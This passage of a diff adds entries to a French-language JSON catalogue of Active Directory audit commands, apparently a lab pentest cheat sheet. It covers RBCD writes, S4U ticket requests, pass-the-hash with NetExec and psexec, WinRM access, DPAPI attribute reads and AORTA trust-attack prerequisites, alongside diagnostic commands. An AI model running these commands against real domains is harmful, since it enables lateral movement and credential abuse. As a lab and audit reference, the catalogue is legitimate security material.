+      "category": "RBCD / S4U"
+    },
+    {
+      "id": "rbcd-ldap-read",
+      "title": "RBCD : examiner le binaire LDAP",
+      "phase": "Délégation",
+      "tool": "ldapsearch",
+      "command": "KRB5CCNAME={{ticket}} ldapsearch -LLL -Y GSSAPI -H ldap://{{dcHost}} -b {{baseDn}} \"(sAMAccountName={{targetComputer}})\" distinguishedName msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "summary": "Lire le champ AD exact derrière la relation RBCD.",
+      "requires": "Ticket valide et LDAP GSSAPI; champ binaire encodé par ldapsearch.",
+      "reading": "Une valeur binaire n’expose pas les SID sans analyse du Security Descriptor.",
+      "next": "Comparer avec le résultat d’impacket-rbcd read.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity",
+      "tags": [
+        "avec-creds",
+        "rbcd"
+      ],
+      "category": "RBCD / S4U"
+    },
+    {
+      "id": "rbcd-maq",
+      "title": "MachineAccountQuota : audit LDAP",
+      "phase": "Délégation",
+      "tool": "ldapsearch",
+      "command": "KRB5CCNAME={{ticket}} ldapsearch -LLL -Y GSSAPI -H ldap://{{dcHost}} -b {{baseDn}} -s base ms-DS-MachineAccountQuota",
+      "summary": "Vérifier si un utilisateur peut créer un compte ordinateur supplémentaire.",
+      "requires": "Lecture du domaine accessible.",
+      "reading": "MAQ = 0 ne supprime pas tous les comptes ordinateurs déjà contrôlés.",
+      "next": "Chercher les identités machines existantes et les droits exacts.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota",
+      "tags": [
+        "avec-creds",
+        "rbcd"
+      ],
+      "category": "RBCD / S4U"
+    },
+    {
+      "id": "rbcd-impacket-write",
+      "title": "RBCD : établir AllowedToAct (lab)",
+      "phase": "Délégation",
+      "tool": "Impacket",
+      "command": "impacket-rbcd -action write -delegate-from {{delegateFrom}} -delegate-to {{targetComputer}} -dc-ip {{target}} {{domain}}/{{user}}:{{password}}",
+      "summary": "Écriture contrôlée du descripteur RBCD en laboratoire.",
+      "requires": "Droit d’écriture confirmé sur l’objet cible; identité source avec SPN; conserver l’état initial.",
+      "reading": "Sans droit effectif la commande échoue; l’écriture AD peut affecter la sécurité du domaine.",
+      "next": "Relire l’attribut, demander le TGS S4U, puis restaurer le descripteur.",
+      "risk": "modifie",
+      "source": "https://github.com/fortra/impacket/blob/master/examples/rbcd.py",
+      "tags": [
+        "avec-creds",
+        "rbcd",
+        "lab-advance"
+      ],
+      "category": "RBCD / S4U"
+    },
+    {
+      "id": "rbcd-getst",
+      "title": "RBCD : S4U2Proxy avec getST",
+      "phase": "Délégation",
+      "tool": "Impacket",
+      "command": "impacket-getST -spn {{spn}} -impersonate {{targetUser}} -dc-ip {{target}} {{domain}}/{{delegateFrom}}:{{password}}",
+      "summary": "Demander un ticket de service dans une relation RBCD valide.",
+      "requires": "AllowedToAct autorisé, source SPN, KDC correct et service cible.",
+      "reading": "KDC_ERR_BADOPTION peut provenir d’une relation absente, d’une preuve S4U insuffisante ou du mauvais SPN.",
+      "next": "Inspecter la ccache et vérifier l’accès au service concerné.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/blob/master/examples/getST.py",
+      "tags": [
+        "avec-creds",
+        "rbcd",
+        "kerberos"
+      ],
+      "category": "RBCD / S4U"
+    },
+    {
+      "id": "rbcd-s4u-steps",
+      "title": "S4U2Self / S4U2Proxy : ordre des preuves",
+      "phase": "Délégation",
+      "tool": "Note",
+      "command": "1. Source avec clé/ticket et SPN valide\n2. S4U2Self: ticket pour un utilisateur vers service source\n3. S4U2Proxy: demande vers SPN cible si délégation autorisée\n4. Vérifier principal, service, flags, temps et autorisation serveur.",
+      "summary": "Méthode d’audit RBCD/delegation pour éviter les raccourcis illogiques.",
+      "requires": "Différencier délégation contrainte classique de RBCD.",
+      "reading": "Le TGS final n’accorde pas nécessairement un droit admin.",
+      "next": "Tester SMB/HTTP/WinRM pour le SPN cible sans transférer le ticket vers le mauvais service.",
+      "risk": "lecture",
+      "source": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html",
+      "tags": [
+        "kerberos",
+        "rbcd"
+      ],
+      "category": "RBCD / S4U"
+    },
+    {
+      "id": "kerberos-ccache",
+      "title": "Kerberos : inspecter le contenu du cache",
+      "phase": "Kerberos",
+      "tool": "klist",
+      "command": "KRB5CCNAME={{ticket}} klist -e",
+      "summary": "Identifier le principal, les services, les types de chiffrement et l’expiration.",
+      "requires": "Un fichier ccache réellement présent et valide.",
+      "reading": "Un TGT n’est pas un TGS; les domaines et SPN doivent correspondre.",
+      "next": "Demander le bon service avant de tester l’accès.",
+      "risk": "lecture",
+      "source": "https://web.mit.edu/kerberos/krb5-latest/doc/user/user_commands/klist.html",
+      "tags": [
+        "kerberos",
+        "avec-creds"
+      ],
+      "category": "Tickets / auth"
+    },
+    {
+      "id": "kerberos-aes-gettgt",
+      "title": "Kerberos : demander TGT avec une clé AES",
+      "phase": "Kerberos",
+      "tool": "Impacket",
+      "command": "impacket-getTGT -dc-ip {{target}} -aesKey {{aesKey}} {{domain}}/{{user}}",
+      "summary": "Tester une clé AES préalablement récupérée par un moyen autorisé.",
+      "requires": "AES128/256 correspondant à la clé de l’identité; même realm/KDC.",
+      "reading": "Clé AES ≠ NT hash; l’authentification ne démontre pas la provenance de la clé.",
+      "next": "Inspecter avec klist avant de contacter un service.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/blob/master/examples/getTGT.py",
+      "tags": [
+        "kerberos",
+        "lab-advance"
+      ],
+      "category": "Tickets / auth"
+    },
+    {
+      "id": "kerberos-ticketconverter",
+      "title": "Kerberos : convertir kirbi vers ccache",
+      "phase": "Kerberos",
+      "tool": "Impacket",
+      "command": "impacket-ticketConverter {{kirbi}} {{ticket}}",
+      "summary": "Convertir un ticket Windows .kirbi en cache utilisable par Kali.",
+      "requires": "Fichier kirbi valide obtenu dans le lab.",
+      "reading": "Le format converti n’étend pas les droits ni la durée du ticket.",
+      "next": "KRB5CCNAME puis klist -e.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py",
+      "tags": [
+        "kerberos",
+        "lab-advance"
+      ],
+      "category": "Tickets / auth"
+    },
+    {
+      "id": "kerberos-smb-ccache",
+      "title": "Kerberos : SMB avec ccache",
+      "phase": "Kerberos",
+      "tool": "Impacket",
+      "command": "KRB5CCNAME={{ticket}} impacket-smbclient -k -no-pass {{domain}}/{{user}}@{{targetHost}}",
+      "summary": "Utiliser un ticket déjà obtenu avec le SPN/FQDN attendu.",
+      "requires": "Ticket non expiré et principal accepté par le service cible.",
+      "reading": "Un ticket cifs/SRV02 ne remplace pas ldap/DC01.",
+      "next": "Valider le service puis limiter les opérations aux partages autorisés.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/blob/master/examples/smbclient.py",
+      "tags": [
+        "kerberos",
+        "lab-advance"
+      ],
+      "category": "Tickets / auth"
+    },
+    {
+      "id": "kerberos-nt-pth",
+      "title": "NetExec : pass-the-hash (validation)",
+      "phase": "Accès",
+      "tool": "NetExec",
+      "command": "nxc smb {{targetHost}} -d {{domain}} -u {{user}} -H {{hash}}",
+      "summary": "Tester si le service accepte NTLM/PTH et quels privilèges sont accordés.",
+      "requires": "NT hash, cible SMB, protocole NTLM autorisé; pas de password spray.",
+      "reading": "STATUS_ACCOUNT_RESTRICTION et NTLM disabled ne se corrigent pas avec -H.",
+      "next": "Comparer avec Kerberos/AES/TGT si le domaine est durci.",
+      "risk": "sensible",
+      "source": "https://www.netexec.wiki/",
+      "tags": [
+        "avec-creds",
+        "hash"
+      ],
+      "category": "Tickets / auth"
+    },
+    {
+      "id": "kerberos-nt-ps",
+      "title": "Impacket : psexec pass-the-hash (admin)",
+      "phase": "Accès",
+      "tool": "Impacket",
+      "command": "impacket-psexec -hashes :{{hash}} {{domain}}/{{user}}@{{targetHost}}",
+      "summary": "Utiliser SMB/SCM uniquement lorsque des droits administrateur sont confirmés.",
+      "requires": "Accès ADMIN$, création de services autorisée et NTLM admis.",
+      "reading": "Authentification valide ≠ admin; services temporaires et AppLocker peuvent bloquer.",
+      "next": "Vérifier la création du service et nettoyer les artefacts après test.",
+      "risk": "sensible",
+      "source": "https://github.com/fortra/impacket/blob/master/examples/psexec.py",
+      "tags": [
+        "avec-creds",
+        "hash"
+      ],
+      "category": "Tickets / auth"
+    },
+    {
+      "id": "winrm-kerberos",
+      "title": "Evil-WinRM Python via Kerberos",
+      "phase": "Accès",
+      "tool": "evil-winrm-py",
+      "command": "KRB5CCNAME={{ticket}} evil-winrm-py -i {{targetHost}} -u {{user}} -r {{domain}}",
+      "summary": "Tester WinRM avec une identité Kerberos sans coller de mot de passe dans la commande.",
+      "requires": "Un TGT valable, WinRM activé et droits Remote Management.",
+      "reading": "Le paquet evil-winrm-py peut avoir des options différentes selon versions; confirmer --help.",
+      "next": "Comparer le principal whoami exécuté à distance.",
+      "risk": "sensible",
+      "source": "https://github.com/Hackplayers/evil-winrm",
+      "tags": [
+        "avec-creds",
+        "kerberos"
+      ],
+      "category": "Accès distant"
+    },
+    {
+      "id": "rdp-smartcard",
+      "title": "FreeRDP 3 : smartcard logon (lab)",
+      "phase": "Accès",
+      "tool": "xfreerdp3",
+      "command": "xfreerdp3 /v:{{targetHost}} /u:{{user}} /d:{{domain}} /smartcard-logon:{{smartcardConfig}} /sec:nla /cert:ignore",
+      "summary": "Authentification RDP par smartcard/PFX lorsque le serveur l’exige.",
+      "requires": "FreeRDP avec support smartcard/PKINIT, template/EKU corrects et mapping valide.",
+      "reading": "Un ticket PKINIT valide dans Kali ne garantit pas que le credential provider RDP acceptera la carte.",
+      "next": "Comparer logs FreeRDP, TERMSRV TGS et événements RDP côté serveur.",
+      "risk": "sensible",
+      "source": "https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface",
+      "tags": [
+        "avec-creds",
+        "adcs",
+        "kerberos"
+      ],
+      "category": "Accès distant"
+    },
+    {
+      "id": "rdp-password",
+      "title": "FreeRDP 3 : session RDP classique",
+      "phase": "Accès",
+      "tool": "xfreerdp3",
+      "command": "xfreerdp3 /v:{{targetHost}} /u:{{user}} /d:{{domain}} /cert:ignore",
+      "summary": "Ouvrir une session RDP et saisir le mot de passe interactif.",
+      "requires": "Le compte est autorisé à ouvrir RDP et NLA est compatible.",
+      "reading": "Ne pas utiliser /p: pour éviter l’exposition du secret dans la liste des processus.",
+      "next": "Confirmer whoami et ID de session Windows.",
+      "risk": "sensible",
+      "source": "https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface",
+      "tags": [
+        "avec-creds"
+      ],
+      "category": "Accès distant"
+    },
+    {
+      "id": "win-klist-sessions",
+      "title": "Windows : LSA/Kerberos logon sessions",
+      "phase": "Windows",
+      "tool": "CMD",
+      "command": "klist sessions",
+      "summary": "Inventorier les sessions Kerberos depuis une identité Windows appropriée.",
+      "requires": "Droits effectifs suffisants pour consulter les sessions cibles.",
+      "reading": "Un RDP Session ID n’est pas le LUID Kerberos; session absente ≠ ancienne authentification inexistante.",
+      "next": "Associer LUID, utilisateur et événements 4624/21/22.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist",
+      "tags": [
+        "windows",
+        "kerberos"
+      ],
+      "category": "Windows / tickets"
+    },
+    {
+      "id": "win-klist",
+      "title": "Windows : tickets du contexte courant",
+      "phase": "Windows",
+      "tool": "CMD",
+      "command": "klist tickets",
+      "summary": "Afficher SPN, principal, échéance et flags des tickets Kerberos dans le contexte Windows.",
+      "requires": "Shell Windows exécuté sous l’identité à examiner.",
+      "reading": "Ne pas confondre tickets système et tickets du compte RDP observé.",
+      "next": "Comparer ticket cible et KDC service accepté.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist",
+      "tags": [
+        "windows",
+        "kerberos"
+      ],
+      "category": "Windows / tickets"
+    },
+    {
+      "id": "win-rdp-sessions",
+      "title": "Windows : utilisateurs RDP",
+      "phase": "Windows",
+      "tool": "CMD",
+      "command": "quser",
+      "summary": "Voir sessions actives/déconnectées et Session IDs.",
+      "requires": "Shell Windows avec visibilité des sessions.",
+      "reading": "Déconnectée et terminée ne signifient pas la même chose; ticket peut expirer.",
+      "next": "Relier aux événements Windows et klist sessions.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/quser",
+      "tags": [
+        "windows"
+      ],
+      "category": "Windows / tickets"
+    },
+    {
+      "id": "win-gpo-rights",
+      "title": "Windows : droits des GPO effectives",
+      "phase": "Windows",
+      "tool": "CMD",
+      "command": "whoami /priv & whoami /groups & gpresult /r",
+      "summary": "Comparer privilèges locaux, groupes et application GPO.",
+      "requires": "Shell Windows; visibilité partielle sous un utilisateur non admin.",
+      "reading": "SeRelabelPrivilege présent mais disabled nécessite un enable explicite par un processus autorisé; SYSTEM local ≠ DA.",
+      "next": "Exporter le GptTmpl.inf de SYSVOL et comparer SID au compte.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami",
+      "tags": [
+        "windows",
+        "gpo"
+      ],
+      "category": "Windows / tokens"
+    },
+    {
+      "id": "win-task-read",
+      "title": "Windows : tâches planifiées via CIM",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-ScheduledTask | Select-Object TaskName,TaskPath,State,@{n=\"User\";e={$_.Principal.UserId}},@{n=\"Execute\";e={$_.Actions.Execute}},@{n=\"Arguments\";e={$_.Actions.Arguments}} | Format-List",
+      "summary": "Recherche des actions, comptes et scripts sans se limiter à une tâche connue.",
+      "requires": "Shell PowerShell; accès à l’API Task Scheduler.",
+      "reading": "La visibilité des tâches peut être partielle selon droits; CIM et schtasks peuvent différer.",
+      "next": "Vérifier le chemin du script, ACL et historique de la tâche.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask",
+      "tags": [
+        "windows",
+        "secrets"
+      ],
+      "category": "Windows / découverte"
+    },
+    {
+      "id": "win-file-acl",
+      "title": "Windows : ACL d’un script/service",
+      "phase": "Windows",
+      "tool": "CMD",
+      "command": "icacls {{windowsPath}}",
+      "summary": "Inspecter permissions sur le fichier plutôt que déduire d’un refus de lister son répertoire.",
+      "requires": "Chemin local complet et visibilité ACL.",
+      "reading": "Traverse directory et read file peuvent varier; appliquer l’ACL au bon objet.",
+      "next": "Documenter SDDL, task principal et action qui consomme le script.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls",
+      "tags": [
+        "windows",
+        "acl"
+      ],
+      "category": "Windows / découverte"
+    },
+    {
+      "id": "win-rdp-eventlog",
+      "title": "Windows : événements de connexion RDP",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-WinEvent -FilterHashtable @{LogName=\"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational\";Id=21,22,24,25} -MaxEvents 30 | Select-Object TimeCreated,Id,Message | Format-List",
+      "summary": "Observer connexions, déconnexions et re-connexions sans conclure trop vite à la cause.",
+      "requires": "Accès au canal eventlog.",
+      "reading": "Corrélation temporelle ≠ preuve de causalité réseau ou PLC.",
+      "next": "Comparer source, utilisateur, ID session et tâche Windows.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent",
+      "tags": [
+        "windows"
+      ],
+      "category": "Windows / découverte"
+    },
+    {
+      "id": "adcs-roaming-ldap",
+      "title": "DPAPI / Credential Roaming : lecture des attributs",
+      "phase": "AD CS",
+      "tool": "ldapsearch",
+      "command": "KRB5CCNAME={{ticket}} ldapsearch -LLL -Y GSSAPI -H ldap://{{dcHost}} -b {{baseDn}} \"(sAMAccountName={{targetUser}})\" msPKIAccountCredentials msPKIDPAPIMasterKeys",
+      "summary": "Vérifier si des attributs de roaming sensibles sont lisibles avec un simple compte domaine.",
+      "requires": "LDAP Kerberos valide, droits read sur les propriétés, stockage privé des données.",
+      "reading": "La lecture d’un blob chiffré n’est pas sa décryption; l’ACL et le type de blob comptent.",
+      "next": "Analyser le format binaire, DPAPI masterkey et protection hors ligne.",
+      "risk": "sensible",
+      "source": "https://learn.microsoft.com/en-us/windows/win32/adschema/a-mspkiaccountcredentials",
+      "tags": [
+        "avec-creds",
+        "adcs",
+        "secrets"
+      ],
+      "category": "AD CS / DPAPI"
+    },
+    {
+      "id": "adcs-cert-publickey",
+      "title": "Vérifier que clé et certificat correspondent",
+      "phase": "AD CS",
+      "tool": "openssl",
+      "command": "openssl x509 -in {{certPem}} -noout -pubkey | openssl sha256; openssl pkey -in {{keyPem}} -pubout | openssl sha256",
+      "summary": "Comparer les hachés de la clé publique du certificat et de la clé privée déchiffrée.",
+      "requires": "Certificat PEM et clé privée locale, stockés hors Git.",
+      "reading": "Les deux empreintes SHA256 doivent être égales; un même CN ne suffit pas.",
+      "next": "Construire PFX avec openssl pkcs12 -export et tester mTLS.",
+      "risk": "lecture",
+      "source": "https://www.openssl.org/docs/manmaster/man1/openssl-pkey.html",
+      "tags": [
+        "adcs",
+        "secrets"
+      ],
+      "category": "AD CS / DPAPI"
+    },
+    {
+      "id": "adcs-esc14-read",
+      "title": "ESC14 : lire altSecurityIdentities",
+      "phase": "AD CS",
+      "tool": "ldapsearch",
+      "command": "KRB5CCNAME={{ticket}} ldapsearch -LLL -Y GSSAPI -H ldap://{{dcHost}} -b {{baseDn}} \"(sAMAccountName={{targetUser}})\" distinguishedName altSecurityIdentities",
+      "summary": "Inspecter un éventuel mapping explicite de certificat vers compte.",
+      "requires": "TGT valide, droits LDAP pour lire l’attribut.",
+      "reading": "Un mapping existant n’implique pas que l’identité courante peut l’éditer.",
+      "next": "Inspecter ACE WriteProperty et template smartcard compatible.",
+      "risk": "lecture",
+      "source": "https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/",
+      "tags": [
+        "adcs",
+        "avec-creds",
+        "acl"
+      ],
+      "category": "AD CS / PKINIT"
+    },
+    {
+      "id": "adcs-pfx-metadata",
+      "title": "Certificat PFX : métadonnées sans exporter clé",
+      "phase": "AD CS",
+      "tool": "openssl",
+      "command": "openssl pkcs12 -in {{cert}} -clcerts -nokeys -info -passin pass: 2>&1 | head -60",
+      "summary": "Identifier l’émetteur, le CN et les contraintes du certificat sans afficher la clé.",
+      "requires": "PFX protégé par mot de passe vide pour cette recette; sinon adapter -passin via fichier.",
+      "reading": "EKU ClientAuth ≠ SmartcardLogon; chaîne CA et SID mapping peuvent bloquer PKINIT.",
+      "next": "Inspecter templates et contrôles de binding AD CS.",
+      "risk": "lecture",
+      "source": "https://docs.openssl.org/master/man1/openssl-pkcs12/",
+      "tags": [
+        "adcs",
+        "secrets"
+      ],
+      "category": "AD CS / PKINIT"
+    },
+    {
+      "id": "adcs-roaming-hashcat",
+      "title": "DPAPI : vérifier le bon mode hashcat",
+      "phase": "Secrets",
+      "tool": "Hashcat",
+      "command": "hashcat --example-hashes | grep -A3 -B3 -E \"DPAPI|15310\" | head -50",
+      "summary": "Identifier la variante du hash DPAPI avant un audit hors-ligne.",
+      "requires": "Parser DPAPI masterkey approprié; format contrôlé.",
+      "reading": "Le mode 15310 concerne le v1/context 3 du cas pratique AD; ne pas généraliser à toutes variantes.",
+      "next": "Valider avec un jeu de test et ne pas mélanger masterkey et password.",
+      "risk": "lecture",
+      "source": "https://hashcat.net/wiki/doku.php?id=example_hashes",
+      "tags": [
+        "hashes",
+        "secrets"
+      ],
+      "category": "AD CS / DPAPI"
+    },
+    {
+      "id": "sql-domain-spn",
+      "title": "MSSQL : repérer SPN de service",
+      "phase": "Identités",
+      "tool": "ldapsearch",
+      "command": "KRB5CCNAME={{ticket}} ldapsearch -LLL -Y GSSAPI -H ldap://{{dcHost}} -b {{baseDn}} \"(servicePrincipalName=MSSQLSvc/*)\" sAMAccountName servicePrincipalName memberOf",
+      "summary": "Lier services SQL aux identités AD et droits avant de tenter un ticket.",
+      "requires": "Utilisateur Kerberos avec lecture LDAP.",
+      "reading": "Un SPN ne prouve pas que l’utilisateur a le droit SQL ni que le mot de passe est faible.",
+      "next": "Comparer GetUserSPNs puis SQL linked servers.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/register-a-service-principal-name-for-kerberos-connections",
+      "tags": [
+        "avec-creds"
+      ],
+      "category": "SQL / services"
+    },
+    {
+      "id": "nxc-smb-signing",
+      "title": "SMB : signature et état NTLM",
+      "phase": "Dépannage",
+      "tool": "NetExec",
+      "command": "nxc smb {{targetHost}}",
+      "summary": "Relever signing, dialect SMB, nom/OS et indices DC.",
+      "requires": "SMB accessible.",
+      "reading": "SMB signing requis affecte NTLM relay, pas tous les abus de tickets Kerberos.",
+      "next": "Mesurer séparément LDAP signing/channel binding et les stratégies NTLM.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing",
+      "tags": [
+        "sans-creds",
+        "defense"
+      ],
+      "category": "Defenses / issues"
+    },
+    {
+      "id": "win-ntlm-event",
+      "title": "Windows : événements blocage NTLM",
+      "phase": "Dépannage",
+      "tool": "PowerShell",
+      "command": "Get-WinEvent -LogName \"Microsoft-Windows-NTLM/Operational\" -MaxEvents 25 | Select-Object TimeCreated,Id,Message | Format-List",
+      "summary": "Diagnostiquer une interdiction NTLM réseau plutôt que retenter des hashes.",
+      "requires": "Shell Windows avec accès au journal.",
+      "reading": "Les journaux peuvent être absents ou désactivés; absence d’événement ≠ autorisation.",
+      "next": "Choisir Kerberos avec SPN, FQDN et AES si disponible.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows/security/identity-protection/ntlm/block-ntlm-connections",
+      "tags": [
+        "windows",
+        "defense"
+      ],
+      "category": "Defenses / issues"
+    },
+    {
+      "id": "kerberos-error-tree",
+      "title": "Kerberos : arbre de diagnostic",
+      "phase": "Dépannage",
+      "tool": "Note",
+      "command": "KRB_AP_ERR_SKEW   => comparer heure DC et client\nKDC_ERR_S_PRINCIPAL_UNKNOWN => SPN inexistant/realm erroné\nKRB_AP_ERR_MODIFIED => service key/SPN incorrect ou dupliqué\nKDC_ERR_BADOPTION => vérifier S4U, délégation et ticket source\nKDC_ERR_POLICY => restrictions de délégation/trust et statut des comptes\nSTATUS_ACCOUNT_RESTRICTION => stratégie d’authentification, pas forcément mauvais hash",
+      "summary": "Faire correspondre chaque code à une hypothèse testable.",
+      "requires": "Conserver la sortie exacte et le contexte du protocole.",
+      "reading": "Un même message peut avoir plusieurs causes; tester la plus faible hypothèse d’abord.",
+      "next": "Changer une seule condition, puis documenter la réponse.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist",
+      "tags": [
+        "kerberos",
+        "defense"
+      ],
+      "category": "Defenses / issues"
+    },
+    {
+      "id": "ntlm-relay-preflight",
+      "title": "NTLM relay/reflection : conditions préalables",
+      "phase": "Dépannage",
+      "tool": "Note",
+      "command": "Avant une réflexion/relay SMB :\n- NTLM réellement autorisé ?\n- SMB signing requis ?\n- LDAP signing / channel binding ?\n- Résolution DNS ciblée et SPN exact ?\n- Flux coercé atteindra-t-il réellement le listener (pas seulement Kali→cible) ?\n- Windows corrigé contre CVE-2025-33073 ?",
+      "summary": "Prévenir les essais stériles face aux durcissements modernes.",
+      "requires": "Vérifier le build/patch et la politique en lab autorisé.",
+      "reading": "CVE-2025-33073 est une vulnérabilité spécifique, pas une technique universelle ni un contournement garanti.",
+      "next": "Documenter la surface validée et consulter l’avis du fournisseur.",
+      "risk": "lecture",
+      "source": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073",
+      "tags": [
+        "defense",
+        "trust",
+        "lab-advance"
+      ],
+      "category": "Defenses / issues"
+    },
+    {
+      "id": "aorta-prerequisites",
+      "title": "AORTA : préconditions et séparation des rôles",
+      "phase": "Trusts",
+      "tool": "Note",
+      "command": "Incoming Forest Trust Builders: création inbound trust\nDnsAdmins: gestion résolution/conditional forwarder\n0x808: ForestTransitive + CrossOrganizationEnableTGTDelegation\nService contrôlé dans forêt distante: réception de l’auth déléguée\nCoercion (DFSCoerce/EFSRPC): mécanismes DISTINCTS, vérifier interface disponible\nExtraction KRB-CRED: checksum authenticator GSS, pas PAC\n# Ne PAS réutiliser un AES fourni et appeler cela un AORTA réalisé.",
+      "summary": "Rappeler les dépendances de l’attaque de confiance; a separate private AD lab fournit un exemple externe.",
+      "requires": "Lab isolé, droits confirmés, forêt réceptrice opérationnelle et réseau retour.",
+      "reading": "Sans trust valide, DNS, délégation et AP-REQ, pas de TGT DC à exploiter.",
+      "next": "Documenter chaque preuve et restauration avant modifications.",
+      "risk": "lecture",
+      "source": "https://specterops.io/blog/2025/06/25/untrustworthy-trust-builders-account-operators-replicating-trust-attack-aorta/",
+      "tags": [
+        "trust",
+        "lab-advance"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "aorta-dns-forward",
+      "title": "DNS conditionnel : audit Windows",
+      "phase": "Trusts",
+      "tool": "PowerShell",
+      "command": "Get-DnsServerConditionalForwarderZone | Select-Object Name,MasterServers,ReplicationScope | Format-Table -AutoSize",
+      "summary": "Lister les zones de forwarding vers autres forêts avant toute modification.",
+      "requires": "Rôle DNS/RSAT et autorisation de lecture.",
+      "reading": "La résolution Kali→DC ne prouve pas le retour DC→forêt.",
+      "next": "Vérifier le service AD DNS et la résolution côté DC.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/dnsserver/get-dnsserverconditionalforwarderzone",
+      "tags": [
+        "windows",
+        "trust"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-current-tickets",
+      "title": "Tickets de referral dans les caches Windows",
+      "phase": "Trusts",
+      "tool": "CMD",
+      "command": "klist",
+      "summary": "Identifier realm d’origine et éventuels tickets krbtgt/FOREIGN.REALM.",
+      "requires": "Contexte authentifié Windows.",
+      "reading": "La présence d’un referral n’implique pas une authentification cible acceptée.",
+      "next": "Demander un TGS pour un SPN distant et valider droits effectifs.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist",
+      "tags": [
+        "windows",
+        "trust",
+        "kerberos"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "trust-sid-history",
+      "title": "LDAP : examiner SID et sidHistory",
+      "phase": "Trusts",
+      "tool": "ldapsearch",
+      "command": "KRB5CCNAME={{ticket}} ldapsearch -LLL -Y GSSAPI -H ldap://{{dcHost}} -b {{baseDn}} \"(sAMAccountName={{targetUser}})\" objectSid sIDHistory memberOf",
+      "summary": "Comprendre les identités SID et l’éventuel filtrage inter-forêts.",
+      "requires": "LDAP Kerberos autorisé dans le domaine interrogé.",
+      "reading": "Un SID extra dans une identité ne sera pas forcément accepté à travers la confiance.",
+      "next": "Comparer type de trust, attributs, sélective auth et tickets PAC.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers",
+      "tags": [
+        "avec-creds",
+        "trust"
+      ],
+      "category": "Multi-forest"
+    },
+    {
+      "id": "ldap-gpo-servers",
+      "title": "GPO : liaisons OU et droit utilisateur",
+      "phase": "Graphe",
+      "tool": "ldapsearch",
+      "command": "KRB5CCNAME={{ticket}} ldapsearch -LLL -Y GSSAPI -H ldap://{{dcHost}} -b {{baseDn}} \"(|(objectClass=organizationalUnit)(objectClass=groupPolicyContainer))\" distinguishedName gPLink displayName gPCFileSysPath",
+      "summary": "Corréler lien OU, conteneur GPO et fichiers de politique dans SYSVOL.",
+      "requires": "LDAP Kerberos et droit read.",
+      "reading": "Une GPO liée ne s’applique pas forcément à tous les utilisateurs ou ordinateurs.",
+      "next": "Lire GptTmpl.inf et comparer SID/User Rights Assignment au jeton.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-policy/group-policy-overview",
+      "tags": [
+        "avec-creds",
+        "gpo"
+      ],
+      "category": "GPO / ACL"
+    },
+    {
+      "id": "windows-app-policy",
+      "title": "Windows : AppLocker / WDAC détection",
+      "phase": "Windows",
+      "tool": "PowerShell",
+      "command": "Get-AppLockerPolicy -Effective -Xml | Select-String -Pattern \"RuleCollection|EnforcementMode\"",
+      "summary": "Vérifier si l’exécution d’outils/scripts est restreinte.",
+      "requires": "Shell PowerShell et accès au module AppLocker.",
+      "reading": "Application d’une règle dépend du chemin, de l’utilisateur et des règles effectives.",
+      "next": "Documenter refus et tester uniquement un binaire approuvé dans le lab.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy",
+      "tags": [
+        "windows",
+        "defense"
+      ],
+      "category": "Windows / découverte"
+    },
+    {
+      "id": "ad-operator-check",
+      "title": "Windows : groupe admins et token actuel",
+      "phase": "Windows",
+      "tool": "CMD",
+      "command": "whoami /all",
+      "summary": "Rassembler groupes, privilèges et niveau d’intégrité sans supposer une élévation de domaine.",
+      "requires": "Shell Windows existant.",
+      "reading": "High IL ≠ SYSTEM; SYSTEM sur un serveur membre ≠ Domain Admin; SID et privilèges effectifs comptent.",
+      "next": "Vérifier les ressources réseau avec l’identité réellement utilisée.",
+      "risk": "lecture",
+      "source": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami",
+      "tags": [
+        "windows"
+      ],
+      "category": "Windows / tokens"
+    },
+    {
+      "id": "dcsync-scope",
+      "title": "DCSync restreint à un compte (lab)",
